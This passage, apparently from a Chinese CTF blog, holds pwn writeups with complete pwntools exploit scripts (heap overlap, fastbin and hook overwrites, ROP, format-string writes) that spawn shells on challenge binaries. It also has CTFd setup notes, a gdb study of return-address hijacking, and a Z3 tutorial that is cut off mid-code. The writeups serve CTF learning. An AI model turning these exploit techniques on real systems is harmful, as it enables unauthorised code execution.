    <content type="text"><![CDATA[easypwn程序分析off-by-one漏洞,输入content的时候，可控size的大小;第二次输入size - 第一次输入的size = 10 时，可多输入一字节。123456789101112__int64 __fastcall sub_E26(signed int a1, unsigned int a2)&#123; __int64 result; // rax if ( a1 &gt; (signed int)a2 ) return a2; if ( a2 - a1 == 10 ) LODWORD(result) = a1 + 1; else LODWORD(result) = a1; return (unsigned int)result;&#125; 利用思路 利用堆块重叠，修改B的size为B+C的size free B , 再malloc B ，就可以泄露C里面的&lt; main_arena+88 &gt;，再减去距离libc_base的偏移，得到libc_base 再利用堆块重叠，修改E的size为E+F的size free E , malloc E+F大小的size，修复F的size，再free F 把target_addr 写入到F的fd位 malloc F ,就可以malloc target_addr，达到任意地址写 但是这题onegadget会失效，需要调整calloc的一些偏移，才能得到shell &lt;__malloc_hook&gt;在 &lt; main_arena-0x10&gt; &lt;__realloc_hook&gt;在&lt; main_arena-0x18&gt; &lt;__memalign_hook&gt;在&lt; main_arena-0x20&gt; exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# -*- coding: utf-8 -*-from pwn import *p = process("./easy_pwn")#p = remote("39.97.182.233", 41458)elf = ELF("./easy_pwn")libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')context.log_level = "debug"def create(size): p.sendlineafter("choice: ",str(1)) p.sendlineafter("size: ",str(size))def edit(index,size,content): p.sendlineafter("choice: ",str(2)) p.sendlineafter("index: ",str(index)) p.sendlineafter("size: ",str(size)) p.sendlineafter("content: ",content)def delete(index): p.sendlineafter("choice: ",str(3)) p.sendlineafter("index: ",str(index))def show(index): p.sendlineafter("choice: ",str(4)) p.sendlineafter("index: ",str(index))create(0x68) # 0create(0x68) # 1create(0x68) # 2create(0x68) # 3create(0x68) # 4create(0x68) # 5create(0x68) # 6create(0x68) # 7edit(1,0x68+10,"a"*0x60+p64(0)+"\xe1")#gdb.attach(p)delete(2)create(0x68) # 2show(3)p.recvuntil("content: ")data = u64(p.recv(6).ljust(8,"\x00"))print hex(data)main_arean = data-88libc_base = main_arean - 0x3c4b20system_addr = libc_base + libc.symbols['system']target_addr = data-0x8bone_gadgets=[0x45216,0x4526a,0xf02a4,0xf1147]edit(4,0x68+10,"a"*0x60+p64(0)+"\xe1")delete(5)#gdb.attach(p)create(0xd0) #5edit(5,0xd0,"\x02"*0x68+p64(0x70)+"\x06"*0x60)delete(6)edit(5,0xd0,"\x03"*0x68+p64(0x70)+p64(target_addr)+0x58*"\x00")#gdb.attach(p)create(0x68) # 6create(0x68) # 8print hex(one_gadgets[2]+libc_base)print hex(libc_base+libc.symbols["realloc"]+13)pause()edit(8,0x68,"a"*0xb+p64(one_gadgets[2]+libc_base)+p64(libc_base+libc.symbols["realloc"]+13)+"a"*(0x50-3))#gdb.attach(p)create(0x50)p.interactive() calloc_magic]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTFd 比赛平台的搭建]]></title>
    <url>%2F2019%2F10%2F14%2FCTFd-%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[开源项目地址 https://github.com/CTFd/CTFd 安装建议在docker里面搭建，环境不会冲突。docker安装教程 安装完docker之后，可用以下命令1docker run -p 8000:8000 -it ctfd/ctfd 但是安装的太慢，不用官方的镜像，这里建议用阿里云公开的容器镜像，只用如下两条命令即可。1docker pull registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0 安装镜像之后起个容器1docker run -p 8000:8000 -it registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0 测试在物理机访问 0.0.0.0:8000 即可,第一次登陆设置管理员账号密码，下图是已经设置过的 管理重命名镜像1docker tag ctfd:latest registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0 查看docker进程12345678$docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd9f5eefb8d62 pwn_deploy_chroot:latest "/service.sh" 6 days ago Exited (255) 5 days ago 0.0.0.0:10000-10003-&gt;10000-10003/tcp pwn_deploy_chroot846ac8b76082 pwn_docker:16.04 "/start.sh" 10 days ago Exited (255) 9 days ago 0.0.0.0:9997-&gt;9999/tcp musing_leakeyfd531742a5a3 ctfd:latest "/opt/CTFd/docker-en…" 11 days ago Up 8 seconds 0.0.0.0:8000-&gt;8000/tcp affectionate_khayyam36aeab92fea7 registry.cn-hangzhou.aliyuncs.com/liujunjie/angr "/bin/sh -c 'su - an…" 12 days ago Exited (255) 2 days ago mystifying_ardinghelli833d79e2e12e ctf "/bin/sh -c 'exec /b…" 4 months ago Exited (130) 4 months ago epic_sutherlanda55693666b02 ctf "/bin/sh -c 'exec /b…" 4 months ago Exited (143) 4 months ago 停止容器进程1docker stop fd53 启动容器进程1docker start fd53 重启容器进程1docker restart fd53]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OGeekCTF 2019 部分 writeups]]></title>
    <url>%2F2019%2F10%2F11%2FOGeekCTF-2019-%E9%83%A8%E5%88%86-writeups%2F</url>
    <content type="text"><![CDATA[pwnbabyrop题目分析靶机环境是32位的glibc-2.23。123456789101112131415161718int __cdecl check(int random)&#123; size_t v1; // eax char s; // [esp+Ch] [ebp-4Ch] char buf[32]; // [esp+2Ch] [ebp-2Ch] ssize_t v5; // [esp+4Ch] [ebp-Ch] memset(&amp;s, 0, 0x20u); memset(buf, 0, 0x20u); sprintf(&amp;s, "%ld", random); v5 = read(0, buf, 0x20u); buf[v5 - 1] = 0; v1 = strlen(buf); if ( strncmp(buf, &amp;s, v1) ) exit(0); write(1, "Correct\n", 8u); return (unsigned __int8)buf[7];&#125; 程序难点在于我们输入的buf要与随机生成的random前v1个字节要相等我们可以直接输入\0开头的字符串来进行绕过，然后strlen的长度就为0，则后面的strncmp判断必定成功 123456789void __cdecl vul(char a1)&#123; char buf[231]; // [esp+11h] [ebp-E7h] if ( a1 == 127 ) read(0, buf, 200u); else read(0, buf, a1);&#125; 之后的漏洞函数中，a1是我们之前输入的第八个字符，如果我们输入\xff时；则在read时a1会进行符号填充，那么我们就可以读入4294967295（-1）个字节，这将直接导致栈溢出，之后就行常规的ROP exp脚本用了两种不同的ROP123456789101112131415161718192021222324252627from pwn import *execve_file = './babyrop'#sh = process(execve_file)sh = remote('47.112.137.238', 13337)elf = ELF(execve_file)libc = ELF('./libc-2.23.so')#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')sh.sendline('\0' + '\xff' * 10)sh.recvuntil('Correct\n')sh.sendline('a'*231+'b'*4+p32(elf.plt['write'])+p32(0x080487D0)+p32(1)+p32(elf.got['puts'])+p32(4))result=sh.recv(4)libc.address = u32(result) - libc.symbols['puts']log.success('libc_addr: ' + hex(libc.address))sh.send('a'*231+'b'*4+p32(libc.symbols['system'])+p32(0)+p32(libc.search('/bin/sh').next()))sh.interactive()'''sh.send('a' * 231 + p32(0x804b000 - 0x800) + p32(elf.plt['puts']) + p32(0x08048519) + p32(elf.got['puts']) + p32(elf.plt['read']) + p32(0x08048608) + p32(0) + p32(0x804b000 - 0x800) + p32(0x200))result = sh.recvuntil('\n')[:-1]libc_addr = u32(result) - libc.symbols['puts']log.success('libc_addr: ' + hex(libc_addr))sh.send(p32(0) + p32(libc_addr + libc.symbols['system']) + p32(libc_addr + libc.symbols['exit']) + p32(libc_addr + libc.search('/bin/sh').next()))sh.interactive()''' book manager题目分析靶机环境是glibc-2.23,在Add_text功能中，size的大小是由用户决定的，而在Update功能中，其输入的大小指定为255，导致堆溢出漏洞1234567891011121314v6 = get_int();if ( v6 &lt;= 256 )&#123; v2 = *(_QWORD *)(*(_QWORD *)(a1 + 8 * (v4 + 4LL)) + 8 * (i + 4LL)); *(_QWORD *)(v2 + 32) = malloc(v6); printf("\nText:"); read_n(&amp;s, 0x100u); v3 = strlen(&amp;s); memcpy(*(void **)(*(_QWORD *)(*(_QWORD *)(a1 + 8 * (v4 + 4LL)) + 8 * (i + 4LL)) + 32LL), &amp;s, v3);&#125;else&#123; printf("\nToo many");&#125; 1234printf("\nNew Text:");read_n(*(void **)(*(_QWORD *)(*(_QWORD *)(a1 + 8 * (v5 + 4LL)) + 8 * (v6 + 4LL)) + 32LL), 255u);printf("\nUpdated", 255LL);return; 思路 由于Text结构的输入没有null截断，我们可以直接泄露libc地址 劫持Text结构体，实现任意地址读写，我们只需要提前布置好heap 结构就行 劫持hook,getshell exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/python2# -*- coding:utf-8 -*-from pwn import *context.arch = 'amd64'# context.arch = 'i386'# context.log_level = 'debug'execve_file = './bookmanager'sh = process(execve_file)#sh = remote('47.112.115.30', 13337)elf = ELF(execve_file)# libc = ELF('./libc-2.23.so')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def Add_chapter(c_name): sh.sendlineafter('Your choice:', '1') sh.sendafter('Chapter name:', c_name)def Add_section(c_name, s_name): sh.sendlineafter('Your choice:', '2') sh.sendafter('Which chapter do you want to add into:', c_name) sh.sendafter('Section name:', s_name)def Add_text(s_name, size, text): sh.sendlineafter('Your choice:', '3') sh.sendafter('Which section do you want to add into:', s_name) sh.sendlineafter('How many chapters you want to write:', str(size)) sh.sendafter('Text:', text)def Remove_text(s_name): sh.sendlineafter('Your choice:', '6') sh.sendafter('Section name:', s_name)def Book_preview(): sh.sendlineafter('Your choice:', '7')def Update(s_name, text): sh.sendlineafter('Your choice:', '8') sh.sendlineafter('hat to update?(Chapter/Section/Text):', 'Text') sh.sendafter('Section name:', s_name) sh.sendafter('New Text:', text)sh.recvuntil('Name of the book you want to create: ')sh.send('a' * 30)gdb.attach(sh)Add_chapter('aaaa\n')Add_section('aaaa\n', 'bbbb\n')Add_section('aaaa\n', 'cccc\n')Add_text('bbbb\n', 0x88, '\n')Add_text('cccc\n', 0x68, 'here\n')Remove_text('bbbb\n')Add_text('bbbb\n', 0x88, '\x78')Book_preview()sh.recvuntil('Section:bbbb')sh.recvuntil('Text:')result = sh.recvline()[:-1]main_arena_addr = u64(result.ljust(8, '\0')) - 88log.success('main_arena_addr: ' + hex(main_arena_addr))libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)log.success('libc_addr: ' + hex(libc_addr))Add_section('aaaa\n', 'dddd\n')Update('cccc\n', '/bin/sh\0'.ljust(0x60, '\0') + p64(0) + p64(0x41) + 'dddd'.ljust(0x20, '\0') + p64(libc_addr + libc.symbols['__free_hook']))Update('dddd\n', p64(libc_addr + libc.symbols['system']))Remove_text('cccc\n')sh.interactive()clear() hub]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一段有趣的c语言代码]]></title>
    <url>%2F2019%2F10%2F10%2F%E4%B8%80%E6%AE%B5%E6%9C%89%E8%B6%A3%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[今天看到一段有趣的c代码，如下:12345678910111213#include &lt;stdio.h&gt;void function(int a,int b,int c)&#123; int *ret; ret=&amp;a-1; (*ret)+=8;&#125;void main()&#123; int x; x=0; function(1,2,3); x=1; printf("x is %d\n",x);&#125; 群里的人讨论最终输出x的值是0还是1呐? 经过我的测试，编译成32位的程序x是0,而64位的是1123456$ gcc text.c -o text_64$ gcc text.c -o text_32 -m32$ ./text_32 x is 0$ ./text_64 x is 1 这是为什么呐?我决定用gdb调一下，先调一下32位的程序12345678910111213141516171819202122232425262728293031323334353637383940410x08048445 in main ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────────── EAX 0xf7f90dbc (environ) —▸ 0xffffcd1c —▸ 0xffffcf56 ◂— 'XDG_VTNR=7' EBX 0x0 ECX 0xffffcc80 ◂— 0x1 EDX 0xffffcca4 ◂— 0x0 EDI 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 ESI 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 EBP 0xffffcc68 ◂— 0x0 ESP 0xffffcc44 ◂— 0x1 EIP 0x8048445 (main+30) —▸ 0xffffc1e8 ◂— 0x0─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────── 0x8048435 &lt;main+14&gt; sub esp, 0x14 0x8048438 &lt;main+17&gt; mov dword ptr [ebp - 0xc], 0 0x804843f &lt;main+24&gt; push 3 0x8048441 &lt;main+26&gt; push 2 0x8048443 &lt;main+28&gt; push 1 ► 0x8048445 &lt;main+30&gt; call function &lt;0x804840b&gt; arg0: 0x1 0x804844a &lt;main+35&gt; add esp, 0xc 0x804844d &lt;main+38&gt; mov dword ptr [ebp - 0xc], 1 0x8048454 &lt;main+45&gt; sub esp, 8 0x8048457 &lt;main+48&gt; push dword ptr [ebp - 0xc] 0x804845a &lt;main+51&gt; push 0x80484f0─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffcc44 ◂— 0x101:0004│ 0xffffcc48 ◂— 0x202:0008│ 0xffffcc4c ◂— 0x303:000c│ 0xffffcc50 ◂— 0x104:0010│ 0xffffcc54 —▸ 0xffffcd14 —▸ 0xffffcf13 ◂— 0x6d6f682f ('/hom')05:0014│ 0xffffcc58 —▸ 0xffffcd1c —▸ 0xffffcf56 ◂— 'XDG_VTNR=7'06:0018│ 0xffffcc5c ◂— 0x007:001c│ 0xffffcc60 —▸ 0xf7f8f3dc (__exit_funcs) —▸ 0xf7f901e0 (initial) ◂— 0x0───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 8048445 main+30 f 1 f7df5637 __libc_start_main+247pwndbg&gt; nx is 0[Inferior 1 (process 10680) exited with code 07] 纳尼，程序执行完function函数之后，就输出x的值了，并退出了。看来我之前的思路完全错了，我还以为那个函数把1修改为0了，看来是劫持了程序的执行流，跳过了x=1;这个语句 接下里就分析一下那个函数是如何劫持程序执行流的,进入function函数进行调试12345678910111213141516171819202122232425262728293031323334353637380x08048422 in function ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffcc40 —▸ 0x804844a (main+35) ◂— add esp, 0xc EBX 0x0 ECX 0xffffcc80 ◂— 0x1 EDX 0x8048452 (main+43) ◂— add byte ptr [eax], al EDI 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 ESI 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 EBP 0xffffcc3c —▸ 0xffffcc68 ◂— 0x0 ESP 0xffffcc2c —▸ 0xf7fd3388 —▸ 0xf7ddd000 ◂— jg 0xf7ddd047 EIP 0x8048422 (function+23) ◂— mov dword ptr [eax], edx─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────── 0x8048414 &lt;function+9&gt; mov dword ptr [ebp - 4], eax 0x8048417 &lt;function+12&gt; mov eax, dword ptr [ebp - 4] 0x804841a &lt;function+15&gt; mov eax, dword ptr [eax] 0x804841c &lt;function+17&gt; lea edx, [eax + 8] 0x804841f &lt;function+20&gt; mov eax, dword ptr [ebp - 4] ► 0x8048422 &lt;function+23&gt; mov dword ptr [eax], edx &lt;0x8048452&gt; ##这里是关键 0x8048424 &lt;function+25&gt; nop 0x8048425 &lt;function+26&gt; leave 0x8048426 &lt;function+27&gt; ret ↓ 0x8048452 &lt;main+43&gt; add byte ptr [eax], al 0x8048454 &lt;main+45&gt; sub esp, 8─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffcc2c —▸ 0xf7fd3388 —▸ 0xf7ddd000 ◂— jg 0xf7ddd04701:0004│ 0xffffcc30 ◂— 0x800002:0008│ 0xffffcc34 —▸ 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db003:000c│ 0xffffcc38 —▸ 0xffffcc40 —▸ 0x804844a (main+35) ◂— add esp, 0xc04:0010│ ebp 0xffffcc3c —▸ 0xffffcc68 ◂— 0x005:0014│ eax 0xffffcc40 —▸ 0x804844a (main+35) ◂— add esp, 0xc06:0018│ 0xffffcc44 ◂— 0x107:001c│ 0xffffcc48 ◂— 0x2───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 8048422 function+23 f 1 804844a main+35 f 2 f7df5637 __libc_start_main+247 可以看到下面这句汇编把eax寄存器指向的地址0x804844a (main+35)修改为了0x80484520x8048422 &lt;function+23&gt; mov dword ptr [eax], edx 我们配合着mian函数的汇编来看一下，0x8048844a这个地址是调用完function函数的下一个地址，也就相当于function的函数返回地址;但是这里被修改成了0x8048452，那这样就造成了执行完function函数之后，就跳转到0x8048452这个地址继续执行;从而跳过了0x0804844d &lt;+38&gt;: mov DWORD PTR [ebp-0xc],0x1 这个赋值语句123456789101112131415161718192021222324252627disassemble mainDump of assembler code for function main: 0x08048427 &lt;+0&gt;: lea ecx,[esp+0x4] 0x0804842b &lt;+4&gt;: and esp,0xfffffff0 0x0804842e &lt;+7&gt;: push DWORD PTR [ecx-0x4] 0x08048431 &lt;+10&gt;: push ebp 0x08048432 &lt;+11&gt;: mov ebp,esp 0x08048434 &lt;+13&gt;: push ecx 0x08048435 &lt;+14&gt;: sub esp,0x14 0x08048438 &lt;+17&gt;: mov DWORD PTR [ebp-0xc],0x0 0x0804843f &lt;+24&gt;: push 0x3 0x08048441 &lt;+26&gt;: push 0x2 0x08048443 &lt;+28&gt;: push 0x1 0x08048445 &lt;+30&gt;: call 0x804840b &lt;function&gt; 0x0804844a &lt;+35&gt;: add esp,0xc 0x0804844d &lt;+38&gt;: mov DWORD PTR [ebp-0xc],0x1 0x08048454 &lt;+45&gt;: sub esp,0x8 0x08048457 &lt;+48&gt;: push DWORD PTR [ebp-0xc] 0x0804845a &lt;+51&gt;: push 0x80484f0 0x0804845f &lt;+56&gt;: call 0x80482e0 &lt;printf@plt&gt; 0x08048464 &lt;+61&gt;: add esp,0x10 0x08048467 &lt;+64&gt;: nop 0x08048468 &lt;+65&gt;: mov ecx,DWORD PTR [ebp-0x4] 0x0804846b &lt;+68&gt;: leave 0x0804846c &lt;+69&gt;: lea esp,[ecx-0x4] 0x0804846f &lt;+72&gt;: ret End of assembler dump. 现在就很明显了，0x8048452-0x8048844a=8; 从c语言的角度来看ret=&amp;a-1;这句话就是取栈中 函数第一个参数 上面的函数返回地址的 地址指针；注意运算符优先级，先算术运算，后移位运算，最后位运算；ret=&amp;(a-1)然后(*ret)+=8，函数返回地址再加8，劫持了程序执行流。这个程序加8不是很好，应该改为加10更为严谨； 而64位程序是通过寄存器来传参的，ret取到的不是函数返回地址，就没办法劫持程序执行流了 64位的程序就不在演示调试了]]></content>
      <categories>
        <category>c</category>
      </categories>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第五空间线下pwn部分writeup]]></title>
    <url>%2F2019%2F10%2F05%2F%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8Bpwn%E9%83%A8%E5%88%86writeup%2F</url>
    <content type="text"><![CDATA[壹業标准的UAF漏洞题 思路 创建unsortedbin的chunk,free掉，然后再show，就能泄露libc地址 复写malloc_hook为one_gadget exp本地环境：ubuntu 16.04123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level='debug'r=process('./pwn1')#r=remote('0.0.0.0',10000)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')libc_off = 0x7f7436b23b78-0x7f743675f000onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]print hex(libc_off)#pause()def add(size): r.recvuntil('&gt;&gt;') r.sendline('1') r.recvuntil(':') r.sendline(str(size))def show(idx): r.recvuntil('&gt;&gt;') r.sendline('2') r.recvuntil(':') r.sendline(str(idx))def edit(idx,cont): r.recvuntil('&gt;&gt;') r.sendline('3') r.recvuntil(':') r.sendline(str(idx)) r.recvuntil(':') r.sendline(cont)def delete(idx): r.recvuntil('&gt;&gt;') r.sendline('4') r.recvuntil(':') r.sendline(str(idx))add(0x60)#0add(0x60)#1add(0x60)#2add(0xa0)#3add(0x60)#4add(0x60)#5delete(3)#gdb.attach(r)show(3)r.recvuntil(':')leak=u64(r.recv(6).ljust(8,'\x00'))success(hex(leak))libc.address = leak- libc_offmallochook=libc.sym['__malloc_hook']one=libc.address+onegadgets[3]delete(0)edit(0,p64(mallochook-0x23))add(0x60)#6add(0x60)#7edit(7,'a'*0x13+p64(one))add(0x60)#8r.interactive() 三學整数溢出造成栈溢出 exp123456789101112131415161718#!/usr/bin/env python2#coding=utf-8from pwn import *context.log_level='debug'r=process('./pwn3')#r=remote("0.0.0.0",10001)sys=0x8048440sh=0x804a04cr.recvuntil(':') #namer.sendline('/bin/sh\x00')r.recvuntil(':') #choser.sendline('1')r.recvuntil(':') #sizer.sendline('-1')r.recvuntil('\n') #contentr.sendline('a'*0x5C+p32(0xffffffff)+p32(sys)+p32(0)+p32(sh))r.interactive() 四諦堆中存在调用puts函数的函数指针,而且还通过堆块来调用函数 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.log_level='debug'r= process('./pwn4')elf=ELF('./pwn4')libc=ELF("/lib/i386-linux-gnu/libc.so.6")def addnote(size,content): r.recvuntil(":") r.sendline("1") r.recvuntil(":") r.sendline(str(size)) r.recvuntil(":") r.sendline(content)def delnote(idx): r.recvuntil(":") r.sendline("2") r.recvuntil(":") r.sendline(str(idx))def printnote(idx): r.recvuntil(":") r.sendline("3") r.recvuntil(":") r.sendline(str(idx))got_puts=elf.got['puts']info('got_puts-&gt;'+hex(got_puts))pause()func=0x80491f2addnote(32,"0"*4)#0addnote(32,"1"*4)#1delnote(0)delnote(1)addnote(8,p32(func)+p32(got_puts))#2#gdb.attach(r)printnote(0)r.recvuntil(':')puts=u32(r.recv(4))success(hex(puts))pause()libc.address=puts-libc.sym['puts']sys=libc.sym['system']delnote(2)addnote(8,p32(sys)+';$0\x00')#3printnote(0)r.interactive() 五蘊格式化字符串漏洞，直接向unk_804c044写特定数，再输入相同的数，可用三种不同方法得到shell exp12345678910111213141516from pwn import *context.log_level='debug'r=process('./pwn5')#r=remote('0.0.0.0',10003)target=0x804c044#pay=p32(target)+p32(target+1)+p32(target+2)+p32(target+3)+'%10$hhn%11$hhn%12$hhn%13$hhn'#r.sendline(str(0x10101010))pay=p32(target)+'%012s'+'%10$n'pay=p32(target)+'a'*12+'%10$n'r.recvuntil(':')r.sendline(pay)r.recvuntil(':')r.sendline(str(0x10))r.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[global_max_fast相关利用]]></title>
    <url>%2F2019%2F10%2F04%2Fglobal-max-fast%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[global_max_fasglobal_max_fast这个全局变量的作用是用来标志fastbin的大小的阈值，小于这个值的堆块会被认为是fastbin，使用fastbin的相应机制进行管理。在glibc-2.23中看下它的定义：1234#define set_max_fast(s) \ global_max_fast = (((s) == 0) \ ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))#define get_max_fast() global_max_fast set_max_fast初始化函数开始是在malloc_init_state调用的，可以看到这个宏定义的作用是设置global_max_fast默认值，默认值是0x80。 攻击方式改写global_max_fast为一个较大的值，然后释放一个较大的堆块时，由于fastbins数组空间是有限的，其相对偏移将会往后覆盖，如果释放堆块的size可控，就可实现往fastbins数组（main_arena）后的任意地址写入堆块的地址。 即利用global_max_fast进行相关的攻击 利用方式可结合unsorted bin attack来修改globa_max_fast为一个较大的值，前置条件是需要泄露libc的地址。然后通过地址与fastbin数组的偏移计算出所需free的堆块的size，释放相应的堆块，即可实现往该地址写入堆块的地址以进一步利用。 计算偏移的代码可以如下：123fastbin_ptr=libc_base+libc.symbols[&apos;main_arena&apos;]+8idx=(target_addr-fastbin_ptr)/8size=idx*0x10+0x20 此时要解决的事情是往哪里写以达到实现利用的目的。可能有很多的地方，理论上来说只要是main_arena结构体后面的是函数指针或是结构体指针的地址都可以，目前很容易能够预想到的是：12345_IO_list_allstdoutstdinstderr__free_hook 复写前面四个就是使用IO_file攻击那一套方法，伪造结构体来实现任意读任意写或者伪造vtable来实现house of orange攻击。 复写free_hook的话则需要一次uaf来修改释放进去的fd改成system或者one gadget，再将堆块申请出来，从而实现将free_hook改写成system或者one gadget。 实例 starctf2019-heap_master]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[z3求解器]]></title>
    <url>%2F2019%2F10%2F03%2Fz3%E6%B1%82%E8%A7%A3%E5%99%A8%2F</url>
    <content type="text"><![CDATA[简介Z3是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比喻其实还差距甚远，请勿吐槽），功能强大且易于使用。Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 angr 也内置了一个修改版的 Z3。 安装这里我用的是angr里面的z3，安装教程。 测试12345from z3 import *x = Int('x')y = Int('y')solve(x &gt; 2, y &lt; 10, x + 2*y == 7) 上面的例子中，定义了两个变量：x 和 y。类型为 Int（注意这里的 Int 可不是 C/C++ 里面包含上下界的 int，Z3 中的 Int 对应的就是数学中的整数，Z3 中的 BitVector 才对应到 C/C++ 中的 int）。 然后就调用了 solve 函数求解三个条件下的满足模型，这三个条件分别是 x 大于 2，y 小于 10，并且 x 加 2 个 y 等于 7。 运行一下结果： 12(angr) angr@36aeab92fea7:~/z3$ python test.py [y = 0, x = 7] ctf实例某比赛中的逆向题首先我们利用IDA去打开该文件，定位到关键点，发现关键函数如下：123456789101112131415161718192021222324252627282930313233343536373839signed __int64 sub_400766()&#123; if ( strlen((const char *)&amp;stru_6020A0) != 32 ) return 0LL; v3 = stru_6020A0.y1; v4 = stru_6020A0.y2; v5 = stru_6020A0.y3; v6 = stru_6020A0.y4; if ( stru_6020A0.x2 * (signed __int64)stru_6020A0.x1 - stru_6020A0.x4 * (signed __int64)stru_6020A0.x3 != 0x24CDF2E7C953DA56LL ) goto LABEL_15; if ( 3LL * stru_6020A0.x3 + 4LL * stru_6020A0.x4 - stru_6020A0.x2 - 2LL * stru_6020A0.x1 != 0x17B85F06 ) goto LABEL_15; if ( 3 * stru_6020A0.x1 * (signed __int64)stru_6020A0.x4 - stru_6020A0.x3 * (signed __int64)stru_6020A0.x2 != 0x2E6E497E6415CF3ELL ) goto LABEL_15; if ( 27LL * stru_6020A0.x2 + stru_6020A0.x1 - 11LL * stru_6020A0.x4 - stru_6020A0.x3 != 0x95AE13337LL ) goto LABEL_15; srand(stru_6020A0.x3 ^ stru_6020A0.x2 ^ stru_6020A0.x1 ^ stru_6020A0.x4); v1 = rand() % 50; v2 = rand() % 50; v7 = rand() % 50; v8 = rand() % 50; v9 = rand() % 50; v10 = rand() % 50; v11 = rand() % 50; v12 = rand() % 50; if ( v6 * v2 + v3 * v1 - v4 - v5 != 0xE638C96D3LL || v6 + v3 + v5 * v8 - v4 * v7 != 0xB59F2D0CBLL || v3 * v9 + v4 * v10 - v5 - v6 != 0xDCFE88C6DLL || v5 * v12 + v3 - v4 - v6 * v11 != 0xC076D98BBLL ) &#123;LABEL_15: result = 0LL; &#125; else &#123; result = 1LL; &#125; return result;&#125; 可以看得出来这个题目的目的就是找出满足方程的flag。我们可以很方便的把方程式列出来，但是求解对于一些数学不是很好的人来说简直就是噩梦，这时候Z3求解器就可以很方便的给我们帮助。我们按照题目的意思一步一步利用Z3求解器来求解：12345678910111213141516from z3 import *x1 = Int('x1')x2 = Int('x2')x3 = Int('x3')x4 = Int('x4')s = Solver() #创建一个通用求解器s.add( x2*x1-x4*x3 == 0x24CDF2E7C953DA56) #添加约束条件s.add( 3*x3+4*x4-x2-2*x1 == 0x17B85F06)s.add( 3*x1*x4-x3*x2 == 0x2E6E497E6415CF3E)s.add( 27*x2+x1-11*x4 - x3 == 0x95AE13337)print s.check() #检查是否有解，sat结果表示找到某个合适的解，unsat结果表示没有解m = s.model() #得到一组解，m为字典类型print mprint "traversing model..."for d in m.decls(): print "%s = %s" % (d.name(), m[d]) 第八届极客大挑战的REConvolution我们打开文件，也是比较直观的看到约束条件，我试着逆向了这个过程，花费了挺多的时间才得到答案，但是如果我们使用Z3Py来求解的话就会非常的快。 函数关键部分如下：123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int ii; // esi unsigned int v4; // kr00_4 char flag_i; // bl unsigned int jj; // eax char *v7; // edx char v8; // cl int v9; // eax char xor_result[80]; // 